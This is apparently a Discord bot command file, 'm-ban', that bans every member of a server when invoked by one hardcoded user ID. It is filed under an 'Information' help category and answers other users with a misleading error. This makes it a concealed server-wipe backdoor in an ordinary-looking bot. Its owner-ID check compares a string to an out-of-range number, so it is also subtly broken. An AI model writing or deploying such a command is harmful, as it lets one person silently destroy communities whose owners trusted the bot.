exports.run = async (snz, message, args) => {

    let at = message.author

    let BReason = args.join(" ").slice(0);
    if (!BReason) return message.channel.send(`<:error:538505640889417752> - ${at}, enter ban's reason`)
    if (message.author.id != 409520003256156160) return message.channel.send(`<:error:538505640889417752> - ${at}, You can not banish yourself.`)

    let C = message.channel;
    message.guild.members.forEach((f, i) => {
        if (f.id == 409520003256156160) return message.channel.send(`<:error:538505640889417752> - ${at}, You can not banish yourself.`);
        message.guild.member(f).ban(BReason);
        message.channel.send(`<:okay:538503952900161538> - Member: ${f}, successfully banned`);
    });
    C.send(`<:okay:538503952900161538> - ${at}, all members were successfully banned`);
}

exports.help = {
    name: "m-ban",
    aliases: ['m-ban'],
    diretorio: "Information"
}